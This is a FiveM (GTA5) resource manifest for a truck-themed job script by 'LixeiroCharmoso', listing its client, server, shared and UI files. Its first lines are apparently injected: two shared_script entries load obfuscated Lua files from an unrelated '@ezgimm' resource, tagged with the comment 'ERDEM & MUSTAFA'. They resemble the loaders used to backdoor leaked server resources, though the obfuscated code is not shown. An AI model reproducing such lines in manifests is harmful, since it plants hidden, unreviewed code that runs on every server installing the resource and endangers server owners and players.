shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA






fx_version 'cerulean'
game 'gta5'
author 'LixeiroCharmoso'

ui_page "nui/ui.html"

lua54 'yes'

escrow_ignore {
	'config.lua',
	'client.lua',
	'server_utils.lua',
	'lang/*.lua',
}

client_scripts {
	"client.lua",
}

server_scripts {
	"@mysql-async/lib/MySQL.lua",
	"server_utils.lua",
	"server.lua"
}

shared_scripts {
	"lang/*.lua",
	"config.lua",
	"@lc_utils/functions/loader.lua",
}

files {
	"nui/lang/*",
	"nui/ui.html",
	"nui/panel.js",
	"nui/css/*",
	"nui/img/*",
	"nui/img/avatar/*",
	"nui/img/icons/*",
	"nui/img/trucks/*",
	"nui/img/trailers/*",
}

dependency "lc_utils"
dependency '/assetpacks'